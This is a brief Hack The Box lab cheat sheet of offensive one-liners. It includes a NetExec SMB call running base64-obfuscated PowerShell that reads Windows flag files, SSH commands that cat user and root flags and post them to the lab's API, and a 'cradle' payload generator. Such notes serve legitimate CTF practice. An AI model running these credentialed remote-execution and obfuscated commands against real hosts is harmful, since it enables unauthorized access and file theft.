# hackthebox
#target/remote #os/linux

## recon_setup.py
```
recon_setup.py <machine_name> -v <vpn_path> -s <session_path> -i <ip> -a
```

## cradle_gen.py
```
cradle_gen.py <lhost> <lport> -l
```

## windows remote flags
```
nxc smb <ip> -u <user|Administrator> <auth> -x 'powershell -e ZABpAHIAIABDADoAXABVAHMAZQByAHMAIAAtAE4AYQBtAGUAfAAlAHsAdAB5AHAAZQAgACIAQwA6AFwAVQBzAGUAcgBzAFwAJABfAFwARABlAHMAawB0AG8AcABcAHUAcwBlAHIALgB0AHgAdAAiACAAMgA+ACQAbgB1AGwAbAB9ADsAdAB5AHAAZQAgAEMAOgBcAFUAcwBlAHIAcwBcAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAXABEAGUAcwBrAHQAbwBwAFwAcgBvAG8AdAAuAHQAeAB0ACAAMgA+ACQAbgB1AGwAbAA='
```

## htb linux user
```
USER_FLAG=$(nxc ssh <ip> -u '<user>' -p '<password>' -x 'echo -n "User: "; cat /home/*/user.txt 2>/dev/null' | awk '/User:/ {print $NF}'); echo "User: $USER_FLAG"; curl -s 'https://labs.hackthebox.com/api/v5/machine/own' -H 'accept: application/json' -H 'Content-Type: application/json' -H "Authorization: Bearer $HTB_TOKEN" -d "{\"flag\": \"$USER_FLAG\",\"id\": $MACHINE_ID}"
```

## htb linux root
```
ROOT_FLAG=$(nxc ssh <ip> -u '<user>' -p '<password>' --key-file ~/.ssh/id_rsa -x 'echo -n "Root: "; cat /root/root.txt 2>/dev/null' | awk '/Root:/ {print $NF}'); echo "Root: $ROOT_FLAG"; curl -s 'https://labs.hackthebox.com/api/v5/machine/own' -H 'accept: application/json' -H 'Content-Type: application/json' -H "Authorization: Bearer $HTB_TOKEN" -d "{\"flag\": \"$ROOT_FLAG\",\"id\": $MACHINE_ID}"
```
